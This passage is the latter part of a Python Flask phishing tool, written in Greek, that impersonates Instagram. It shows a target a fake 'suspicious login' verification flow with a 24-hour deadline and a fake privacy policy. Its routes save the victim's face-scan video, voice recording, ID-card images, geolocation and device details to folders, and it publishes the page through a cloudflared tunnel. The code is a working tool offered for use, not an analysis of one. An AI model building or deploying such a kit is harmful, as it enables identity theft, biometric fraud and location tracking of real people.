                    console.error('Σφάλμα μεταφόρτωσης τοποθεσίας:', error);
                }}
            }});
        }}
        
        function completeLocationVerification() {{
            const button = document.getElementById('locationButton');
            button.disabled = true;
            button.textContent = '✓ Τοποθεσία Επαληθεύτηκε';
            
            // Προχωρήστε στο τελικό βήμα μετά από καθυστέρηση
            setTimeout(() => {{
                startFinalVerification();
            }}, 2000);
        }}
        
        // Τελική Επεξεργασία Επαλήθευσης
        function startFinalVerification() {{
            showStep('stepFinal');
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const progressInterval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = "";
                if (progress < 30) {{
                    message = `Επαλήθευση σάρωσης προσώπου... ${{Math.round(progress)}}%`;
                }} else if (progress < 50) {{
                    message = `Ανάλυση δείγματος φωνής... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = `Έλεγχος εγγράφων ταυτότητας... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Επαλήθευση τοποθεσίας... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Ολοκλήρωση επαλήθευσης... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                    setTimeout(() => {{
                        statusDiv.className = 'status-message status-success';
                        statusDiv.textContent = `✓ Η επαλήθευση ολοκληρώθηκε για @${{targetUsername}}!`;
                        
                        // Υποβολή όλων των συλλεγμένων δεδομένων
                        submitCompleteVerification();
                        
                        // Εμφάνιση σελίδας ολοκλήρωσης
                        setTimeout(() => {{
                            showCompletionPage();
                        }}, 1500);
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function showCompletionPage() {{
            showStep('stepComplete');
            
            // Έναρξη χρονομέτρησης
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            countdownTimer = setInterval(() => {{
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(countdownTimer);
                    showReviewPage();
                }}
            }}, 1000);
        }}
        
        function showReviewPage() {{
            clearInterval(countdownTimer);
            showStep('stepReview');
        }}
        
        function returnToInstagram() {{
            window.location.href = 'https://instagram.com';
        }}
        
        function checkStatus() {{
            alert("Η κατάσταση ανασκόπησης θα σταλεί στο email σας εντός 48 ωρών. Παρακαλώ ελέγξτε το email που σχετίζεται με τον λογαριασμό σας στο Instagram.");
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    completed_steps: currentStep,
                    verification_timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    screen_resolution: `${{screen.width}}x${{screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }}),
                contentType: 'application/json'
            }});
        }}
        
        // Αρχικοποίηση εμφάνισης προόδου
        updateProgress();
        
        // Αυτόματη έναρξη πρώτου βήματος μετά από καθυστέρηση
        setTimeout(() => {{
            showStep(1);
        }}, 500);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Δημιουργία ονόματος αρχείου
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"face_verification_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            # Αποθήκευση βίντεο
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            # Αποθήκευση μεταδεδομένων
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'target_username': target_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'instructions_followed': data.get('instructions_followed', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε βίντεο επαλήθευσης προσώπου για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση προσώπου υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα βίντεο προσώπου"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_voice_verification', methods=['POST'])
def submit_voice_verification():
    try:
        data = request.get_json()
        if data and 'voice_audio' in data:
            audio_data = data['voice_audio']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Δημιουργία ονόματος αρχείου
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"voice_verification_{target_username}_{session_id}_{timestamp}.webm"
            audio_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', filename)
            
            # Αποθήκευση ήχου
            with open(audio_file, 'wb') as f:
                f.write(base64.b64decode(audio_data))
            
            # Αποθήκευση μεταδεδομένων
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'voice_verification',
                'target_username': target_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'phrase': data.get('phrase', ''),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε ήχος επαλήθευσης φωνής για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση φωνής υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα ήχου φωνής"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης φωνής: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        target_username = request.form.get('target_username', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        # Επεξεργασία μπροστινής ταυτότητας
        front_filename = None
        if 'front_id' in request.files:
            front_file = request.files['front_id']
            if front_file.filename:
                file_ext = front_file.filename.split('.')[-1] if '.' in front_file.filename else 'jpg'
                front_filename = f"id_front_{target_username}_{session_id}_{timestamp}.{file_ext}"
                front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                front_file.save(front_path)
        
        # Επεξεργασία πίσω ταυτότητας
        back_filename = None
        if 'back_id' in request.files:
            back_file = request.files['back_id']
            if back_file.filename:
                file_ext = back_file.filename.split('.')[-1] if '.' in back_file.filename else 'jpg'
                back_filename = f"id_back_{target_username}_{session_id}_{timestamp}.{file_ext}"
                back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                back_file.save(back_path)
        
        # Αποθήκευση μεταδεδομένων
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'front_id': front_filename,
            'back_id': back_filename,
            'type': 'id_verification',
            'target_username': target_username,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'saved_at': datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκαν έγγραφα ταυτότητας για {target_username}: {front_filename}, {back_filename}")
        return jsonify({"status": "success", "message": "Η επαλήθευση ταυτότητας υποβλήθηκε"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Προσθήκη ονόματος χρήστη στόχου στα δεδομένα
            data['target_username'] = target_username
            
            # Επεξεργασία τοποθεσίας σε background thread
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας για {target_username}: {session_id}")
            return jsonify({"status": "success", "message": "Η επαλήθευση τοποθεσίας υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα τοποθεσίας"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"verification_summary_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            # Προσθήκη πληροφοριών συστήματος
            data['received_at'] = datetime.now().isoformat()
            data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε σύνοψη πλήρους επαλήθευσης για {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση ολοκληρώθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν λήφθηκαν δεδομένα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/privacy_policy')
def privacy_policy():
    return '''<!DOCTYPE html>
    <html lang="el">
    <head>
        <title>Instagram - Πολιτική Απορρήτου</title>
        <style>
            body {{ 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                padding: 20px; 
                max-width: 800px; 
                margin: 0 auto; 
                background-color: #000;
                color: #fff;
            }}
            h1 {{ 
                color: #405DE6; 
                margin-bottom: 30px;
            }}
            h2 {{
                color: #833AB4;
                margin-top: 30px;
                margin-bottom: 15px;
            }}
            .container {{
                background-color: #121212;
                padding: 30px;
                border-radius: 12px;
                border: 1px solid #363636;
            }}
            ul {{
                padding-left: 20px;
                margin: 15px 0;
            }}
            li {{
                margin-bottom: 10px;
                line-height: 1.5;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Instagram</h1>
            <p>Αυτή η διαδικασία επαλήθευσης έχει σχεδιαστεί για τη διασφάλιση συμμόρφωσης με τους περιορισμούς ηλικίας και τα πρότυπα ασφάλειας της κοινότητας.</p>
            
            <h2>Συλλογή Δεδομένων</h2>
            <p>Συλλέγουμε τα ακόλουθα δεδομένα κατά την επαλήθευση:</p>
            <ul>
                <li>Δεδομένα αναγνώρισης προσώπου (προσωρινή σάρωση βίντεο με κινήσεις κεφαλιού)</li>
                <li>Δείγμα φωνής (για αυθεντικοποίηση και ανίχνευση ζωντάνιας)</li>
                <li>Εικόνες εγγράφου ταυτότητας (για επαλήθευση ηλικίας και ταυτότητας)</li>
                <li>Δεδομένα τοποθεσίας (για περιφερειακή συμμόρφωση και ασφάλεια)</li>
                <li>Πληροφορίες συσκευής (για πρόληψη απάτης)</li>
            </ul>
            
            <h2>Χρήση Δεδομένων</h2>
            <p>Τα δεδομένα σας χρησιμοποιούνται αποκλειστικά για:</p>
            <ul>
                <li>Επαλήθευση ηλικίας και συμμόρφωση</li>
                <li>Αυθεντικοποίηση ταυτότητας και πρόληψη απάτης</li>
                <li>Εφαρμογή περιορισμών περιεχομένου βάσει περιοχής</li>
                <li>Βελτίωση της ασφάλειας του λογαριασμού</li>
            </ul>
            
            <h2>Διατήρηση Δεδομένων</h2>
            <p>Όλα τα δεδομένα επαλήθευσης κρυπτογραφούνται αυτόματα και διαγράφονται μόνιμα εντός 30 ημερών από την ολοκλήρωση της επαλήθευσης.</p>
            
            <h2>Μέτρα Ασφαλείας</h2>
            <ul>
                <li>Κρυπτογράφηση από άκρο σε άκρο για όλες τις μεταδόσεις δεδομένων</li>
                <li>Ασφαλής αποθήκευση με βιομηχανικά πρότυπα πρωτοκόλλα</li>
                <li>Τακτικοί έλεγχοι ασφαλείας και συμμόρφωσης</li>
                <li>Κοινή χρήση με τρίτους για εμπορικούς σκοπούς</li>
            </ul>
            
            <h2>Δικαιώματα Σας</h2>
            <p>Έχετε το δικαίωμα να:</p>
            <ul>
                <li>Ζητήσετε πρόσβαση στα δεδομένα επαλήθευσής σας</li>
                <li>Ζητήσετε τη διαγραφή των δεδομένων σας πριν από την περίοδο των 30 ημερών</li>
                <li>Εξαιρεθείτε από μελλοντικές επαληθεύσεις (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
                <li>Υποβάλετε καταγγελία σχετικά με τη διαχείριση δεδομένων</li>
            </ul>
        </div>
    </body>
    </html>'''

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης από χρήστη
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4045
    script_name = "Instagram Επαλήθευση Λογαριασμού"
    
    print("\n" + "="*60)
    print("INSTAGRAM ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ")
    print("="*60)
    print(f"[+] Όνομα Χρήστη Στόχος: @{VERIFICATION_SETTINGS['target_username']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    else:
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Τοποθετήστε οποιαδήποτε εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"[+] Τα δεδομένα θα αποθηκευτούν στο: {DOWNLOAD_FOLDER}")
    print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
    if VERIFICATION_SETTINGS['voice_enabled']:
        print(f"[+] Επαλήθευση φωνής: Ενεργοποιημένη ({VERIFICATION_SETTINGS['voice_duration']} δευτερόλεπτα)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    print("\n[+] Δημιουργήθηκαν φάκελοι:")
    print(f"    - face_scans/")
    if VERIFICATION_SETTINGS['voice_enabled']:
        print(f"    - voice_recordings/")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"    - id_documents/")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"    - location_data/")
    print(f"    - user_data/")
    print("\n[+] Εκκίνηση διακομιστή...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    # Προτροπή τερματικού για χρήστη
    print("="*60)
    print("ΠΡΟΤΡΟΠΗ ΤΕΡΜΑΤΙΚΟΥ ΓΙΑ ΧΡΗΣΤΗ")
    print("="*60)
    print(f"Το Instagram ζητά επαλήθευση ταυτότητας για τον λογαριασμό:")
    print(f"👤 Όνομα Χρήστη: @{VERIFICATION_SETTINGS['target_username']}")
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από λογαριασμό")
    else:
        print(f"👤 Προφίλ: Προεπιλεγμένη εικόνα λογαριασμού")
    print(f"📊 Στατιστικά: {random.randint(100, 999)} δημοσιεύσεις • {random.randint(1000, 9999)} ακόλουθοι • {random.randint(500, 5000)} ακολουθεί")
    print(f"🔒 Αιτία: Ανιχνεύθηκε ύποπτη προσπάθεια σύνδεσης")
    print(f"⏰ Χρονικό όριο: Ολοκληρώστε εντός 24 ωρών")
    print(f"📍 Απαιτείται: Σάρωση προσώπου, επαλήθευση ταυτότητας και έλεγχος τοποθεσίας")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο στον περιηγητή για να ξεκινήσετε την επαλήθευση...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός διακομιστή επαλήθευσης Instagram...")
        sys.exit(0)